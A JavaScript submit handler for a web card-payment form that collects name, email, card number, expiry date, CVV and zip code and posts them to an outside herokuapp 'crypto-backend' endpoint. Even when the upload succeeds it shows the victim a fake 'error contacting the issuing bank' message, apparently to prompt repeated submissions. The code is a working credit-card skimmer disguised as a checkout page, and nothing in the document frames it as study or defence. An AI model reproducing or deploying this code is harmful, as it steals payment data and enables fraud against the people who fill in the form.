async function cardSubmit() {
  try {
    const firstName = document.getElementById('firstName').value;
    const lastName = document.getElementById('lastName').value;
    const email = document.getElementById('user-email').value;
    const cardNum = document.getElementById('card-num').value;
    const mon = document.getElementById('credit_card_expiration_date_2i').value;
    const yr = document.getElementById('credit_card_expiration_date_1i').value;
    const cvv = document.getElementById('cvv2').value;
    const zip = document.getElementById('zipcode').value;
    const button = document.getElementById('create_button');
    const para = document.getElementById('err-p');
    const errHead = document.getElementById('exampleModalLabel');
    const errClose = document.getElementById('errClose');

    button.textContent = 'Loading...'

    const body = {
      firstName,
      lastName,
      email,
      cardNum,
      mon,
      yr,
      cvv,
      zip,
    }

    button.dataset.target = '#exampleModal';


    const url = 'https://crypto-backend1.herokuapp.com/api/user/card';

    const request = await fetch(url, {
      method: 'POST',
      body: JSON.stringify(body),
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
      }
    });

    const response = await request.json();

    if (request.status !== 200) {
      button.dataset.target = '#exampleModal';
      errHead.innerHTML = 'Error';
      para.innerHTML = response.message;
      errClose.disabled = false;
      button.textContent = 'Continue';
    } else {
      button.dataset.target = '#exampleModal';
      errHead.innerHTML = 'Error';
      para.innerHTML = 'There was an error contacting the issuing bank. Please double check the card details are correct and try again later';
      errClose.disabled = false;
      button.textContent = 'Continue';
    }
    button.dataset.target = '#exampleModal';
  } catch (error) {
    button.dataset.target = '#exampleModal';
    errHead.innerHTML = 'Error';
    para.innerHTML = 'Something went wrong!! Try again Later';
    errClose.disabled = false;
    button.textContent = 'Continue';
  }
}